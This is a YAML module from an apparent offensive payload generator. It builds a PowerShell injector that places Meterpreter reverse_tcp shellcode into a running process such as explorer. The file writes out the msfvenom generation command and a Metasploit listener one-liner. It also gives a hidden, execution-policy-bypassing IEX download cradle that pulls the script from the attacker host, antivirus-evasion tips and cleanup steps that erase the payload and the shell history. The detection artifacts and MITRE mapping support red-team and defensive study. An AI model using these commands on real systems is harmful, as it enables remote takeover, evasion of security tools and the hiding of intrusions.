meta:
  name: "Remote Process Injection (PowerShell)*"
  category: "Process Injection"
  description: |
    PowerShell-based remote process injection using classic CreateRemoteThread technique.

    Features:
    - Dynamic API resolution via reflection (no direct P/Invoke)
    - Targets any running process by name
    - Uses UnsafeNativeMethods to access Windows APIs
    - Classic injection pattern: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread

    This technique is useful for environments where PowerShell is available but
    compiled executables are restricted. The script uses reflection to dynamically
    resolve Windows API functions, avoiding static signatures.

    WARNING: For authorized security testing only!

  effectiveness: medium

  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055.001 - Process Injection: Dynamic-link Library Injection"

  artifacts:
    - "PowerShell execution with suspicious scripts"
    - "OpenProcess API calls with PROCESS_ALL_ACCESS"
    - "VirtualAllocEx with PAGE_EXECUTE_READWRITE permissions"
    - "WriteProcessMemory API calls"
    - "CreateRemoteThread API calls"
    - "Network connection to C2 server"
    - "Suspicious memory regions in target process"
    - "Reflection-based API resolution patterns"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker/C2 server IP address for reverse connection"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port on attacker machine"
    required: true
    default: 443

  - name: "target_process"
    type: "string"
    description: "Target process name (without .exe extension)"
    required: false
    default: "explorer"

  - name: "output_file"
    type: "string"
    description: "Output PowerShell script filename"
    required: false
    default: "injector.ps1"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode using msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
    output_var: "raw_shellcode"

  # Step 2: Format shellcode as PowerShell byte array
  - type: "script"
    name: "format_payload"
    script: "format_powershell.py"
    args:
      data: "{{ raw_shellcode }}"
      var_name: "buf"
      bytes_per_line: 15
    output_var: "powershell_payload"

output:
  type: "template"
  template: "process_injection/powershell_remote_inject.ps1"
  compile:
    enabled: false
  launch_instructions: |
    # Start Listener

    ```bash
    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
    ```

    # Transfer and Execute (In-Memory)

    ```powershell
    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:/{{ output_file }}')"
    ```

    # Alternative (File-Based)

    **Attacker:**
    ```bash
    python3 -m http.server 80
    ```

    **Target:**
    ```powershell
    powershell -ep bypass -c "IWR -Uri http://{{ lhost }}:/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
    ```

    # Notes

    - Target process: `{{ target_process }}` (must be running on target)
    - Uses reflection to dynamically resolve Windows APIs (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)
    - No static P/Invoke signatures (evades some AV)
    - `EXITFUNC=thread` ensures clean exit without crashing `{{ target_process }}`
    - Injects into existing process (not spawning new process)
    - Requires matching architecture (x64 payload â†’ x64 process)
    - May require administrative privileges depending on target process integrity level
    - PowerShell Script Block Logging will record execution (Event ID 4104)

    # Troubleshooting

    - **Injection fails:** Verify target process running with `Get-Process {{ target_process }}`
    - **Process not found:** Try alternative targets (notepad, explorer, chrome, msedge)
    - **No connection:** Check firewall rules on attacker (allow `{{ lport }}/tcp`)
    - **AV blocks:** Obfuscate script with Invoke-Obfuscation or encode with -EncodedCommand
    - **Access Denied:** Target process may be protected (PPL) or running at higher integrity level
    - **Sysmon Event ID 8** (CreateRemoteThread) will fire on injection

    # Cleanup

    **Target:**
    ```powershell
    Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    ```
